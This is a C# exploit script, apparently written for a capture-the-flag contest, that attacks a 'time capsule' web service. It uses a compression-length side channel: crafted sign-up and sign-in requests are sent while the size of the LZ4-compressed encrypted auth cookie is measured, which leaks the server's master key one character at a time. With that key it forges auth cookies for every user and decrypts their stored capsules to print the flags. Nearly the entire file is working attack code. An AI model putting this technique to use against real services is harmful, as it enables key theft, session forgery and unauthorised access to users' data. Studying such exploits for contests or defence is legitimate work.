using System.Net;
using System.Net.Http.Json;
using System.Text.RegularExpressions;
using checker.timecapsule;

var baseUri = new Uri("http://10.60.2.8:7007/");

const string signUpRelative = "/signup";
const string signInRelative = "/signin";
const string capsulesListRelative = "/capsules";

Guid publicKey = new("13371337-1337-1337-1337-133713371337");

var flagRegex = new Regex(@"\b[0-9A-Za-z]{31}=", RegexOptions.Compiled | RegexOptions.CultureInvariant);

// This unicode chars are used to expand the space in cookie encryption buffer onto unused memory.
const int expanderLength = 30;
var hackerLoginPrefix = new string('\u212A', expanderLength) + $"|{Convert.ToBase64String(Guid.NewGuid().ToByteArray(), 0, 6)}|";

var hackerPassword = "Timey-Wimey Stuff 1337";

if(args.Length == 2 && int.TryParse(args[1], out var port))
	baseUri = new Uri($"http://{args[0]}:{port}/");

var cookies = new CookieContainer();
using var handler = new SocketsHttpHandler { MaxConnectionsPerServer = 100500, PooledConnectionIdleTimeout = TimeSpan.FromMinutes(1) };
using var client = new HttpClient(new HttpClientHandler { CookieContainer = cookies }, true) { BaseAddress = baseUri };

/* How LZ4 works: https://github.com/lz4/lz4/blob/dev/doc/lz4_Block_format.md
 * 4-bit field is used for a matchlength, the minimum length of a match, called minmatch, is 4.
 * As a consequence, a 0 value means 4 bytes, and a value of 15 means 19+ bytes.
 * With matchlength greater than 18 yet another byte used, so the total length of the compressed data increases.
 * That's why we use 18-byte window here. */
const int maxWindowSize = 18;

int retries = 0;
string prefix = "\"key\":\"";
string keyMask = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";
char[] payloadChars = (prefix + keyMask).ToCharArray();

var (from, to, inc) = (-1, 0xf, 1);
for(int i = prefix.Length; i < prefix.Length + keyMask.Length; i++)
{
	if(payloadChars[i] == '-')
		continue;

	int prev = 0;
	var curWindowSize = Math.Min(i + 1, maxWindowSize);
	var startIndex = Math.Max(0, Math.Min(payloadChars.Length - curWindowSize, i + 1 - curWindowSize));
	for(int c = from; c <= Math.Max(from, to) && c >= Math.Min(from, to); c += inc)
	{
		payloadChars[i] = c < 0 || c > 0xf ? 'X' : c.ToString("x")[0];

		var payload = new string(payloadChars, startIndex, curWindowSize) + '|';
		var hacker = hackerLoginPrefix + payload;

		var wrapped = TimeCapsuleWrapper.Wrap(new Container { Author = hacker, Text = hackerPassword }, publicKey);
		using var result1 = await client.PostAsync($"{signUpRelative}?wrapped={WebUtility.UrlEncode(wrapped)}", null);

		// Only signin is vulnerable
		wrapped = TimeCapsuleWrapper.Wrap(new Container { Author = hacker, Text = hackerPassword }, publicKey);
		using var result2 = await client.PostAsync($"{signInRelative}?wrapped={WebUtility.UrlEncode(wrapped)}", null);

		var auth = cookies.GetAllCookies()["auth"]?.Value;
		var length = Convert.FromBase64String(WebUtility.UrlDecode(auth)).Length;

		await StdErrWriteCharsAsync(payloadChars, prefix.Length, i - prefix.Length, ConsoleColor.Green);
		await StdErrWriteCharsAsync(payloadChars, i, 1, ConsoleColor.Yellow);
		await StdErrWriteCharsAsync(payloadChars, i + 1, payloadChars.Length - i - 1);
		await StdErrWriteAsync($"\t{length}\t");
		await StdErrWriteLineAsync(payload, ConsoleColor.Red);

		if(length < prev)
			break;

		if(c == to)
		{
			await StdErrWriteLineAsync($"Failed to find the best char on iteration {i - prefix.Length}, sleep and retrying...", ConsoleColor.DarkYellow);

			retries++;
			if(retries >= 10)
			{
				await StdErrWriteLineAsync("Retry limit exceeded, seems unexploitable :(", ConsoleColor.DarkYellow);
				return;
			}

			i--;
			if(retries % 2 == 0 && i >= prefix.Length)
			{
				await StdErrWriteLineAsync("Backtrack on previous iteration, the previous character may have been selected incorrectly", ConsoleColor.DarkYellow);
				(from, to, inc) = from < 0 ? (0xf + 1, 0, -1) : (-1, 0xf, 1); // Reverse the order
				i--;
			}

			await Task.Delay(5000);
		}

		prev = length;
	}
}

var key = new Guid(new string(payloadChars, prefix.Length, 36));
await StdErrWriteLineAsync($"MASTER KEY: {key}", ConsoleColor.Magenta);

var authors = (await client.GetFromJsonAsync(capsulesListRelative, typeof(Container[])) as Container[] ?? Array.Empty<Container>()).Select(item => item.Author).Distinct().ToArray();
await StdErrWriteLineAsync($"Find {authors.Length} authors: {string.Join(", ", authors)}");

foreach(var author in authors)
{
	var user = new Container { CreateDate = DateTime.MaxValue, Author = author };
	var hackAuth = WebUtility.UrlEncode(TimeCapsuleWrapper.Wrap(user, key));
	await StdErrWriteLineAsync($"Author {author}, auth {hackAuth}");

	cookies = new CookieContainer();
	cookies.Add(baseUri, new Cookie("auth", hackAuth));

	var client2 = new HttpClient(new HttpClientHandler { CookieContainer = cookies }, true) { BaseAddress = baseUri };
	var items = await client2.GetFromJsonAsync($"{capsulesListRelative}?author={WebUtility.UrlEncode(author)}", typeof(Container[])) as Container[] ?? Array.Empty<Container>();

	foreach(var item in items)
	{
		var cap = TimeCapsuleWrapper.Unwrap(item.TimeCapsule, item.Secret ?? Guid.Empty);
		foreach(var match in flagRegex.Matches(cap.Text ?? string.Empty).OfType<Match>())
			Console.WriteLine(match.Value.ToUpper());
	}
}

static async Task StdErrWriteLineAsync(string text, ConsoleColor color = ConsoleColor.DarkGray)
{
	await StdErrWriteAsync(text, color);
	await Console.Error.WriteAsync(Environment.NewLine);
}

static async Task StdErrWriteAsync(string text, ConsoleColor color = ConsoleColor.DarkGray)
{
	Console.ForegroundColor = color;
	await Console.Error.WriteAsync(text);
	Console.ResetColor();
}

static async Task StdErrWriteCharsAsync(char[] buffer, int index, int count, ConsoleColor color = ConsoleColor.DarkGray)
{
	Console.ForegroundColor = color;
	await Console.Error.WriteAsync(buffer, index, count);
	Console.ResetColor();
}
